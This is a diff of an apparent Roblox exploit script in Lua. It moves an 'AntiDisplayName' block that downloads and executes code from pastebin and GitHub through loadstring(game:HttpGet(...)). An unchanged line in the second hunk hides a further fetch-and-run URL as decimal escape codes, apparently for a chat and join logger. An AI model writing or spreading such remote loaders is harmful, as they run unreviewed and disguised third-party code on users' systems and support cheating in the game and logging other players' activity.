@@ -1,3 +1,21 @@
+local AntiDisplayName = loadstring(game:HttpGet('https://pastebin.com/raw/hCMXnKWa'))(function()
+    getgenv().Preferences = {}
+end)
+
+Preferences = {
+    RetroNaming = false,
+    ShowOriginalName = true,
+    ApplyToLeaderboard = true,
+    IdentifyFriends = {Toggle = true, Identifier = '[Friend]'},
+    IdentifyBlocked = {Toggle = true, Identifier = '[Blocked]'},
+    IdentifyPremium = {Toggle = true, Identifier = '[Premium]'},
+    IdentifyDeveloper = {Toggle = true, Identifier = '[Game Dev]'},
+    SpoofLocalPlayer = {Toggle = false, UseRandomName = true, NewName = 'Random Name Lol'},
+    Orientation = 'Horizontal'
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Barney1"))()
+
 
 
 
@@ -363,22 +381,3 @@ tool.Parent = game.Players.LocalPlayer.Backpack
 end)
 
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\109\97\105\110\47\67\104\97\116\108\111\103\115\97\110\100\106\111\105\110\108\111\103\115\10"))()
-
-
-local AntiDisplayName = loadstring(game:HttpGet('https://pastebin.com/raw/hCMXnKWa'))(function()
-    getgenv().Preferences = {}
-end)
-
-Preferences = {
-    RetroNaming = false,
-    ShowOriginalName = true,
-    ApplyToLeaderboard = true,
-    IdentifyFriends = {Toggle = true, Identifier = '[Friend]'},
-    IdentifyBlocked = {Toggle = true, Identifier = '[Blocked]'},
-    IdentifyPremium = {Toggle = true, Identifier = '[Premium]'},
-    IdentifyDeveloper = {Toggle = true, Identifier = '[Game Dev]'},
-    SpoofLocalPlayer = {Toggle = false, UseRandomName = true, NewName = 'Random Name Lol'},
-    Orientation = 'Horizontal'
-}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Barney1"))()
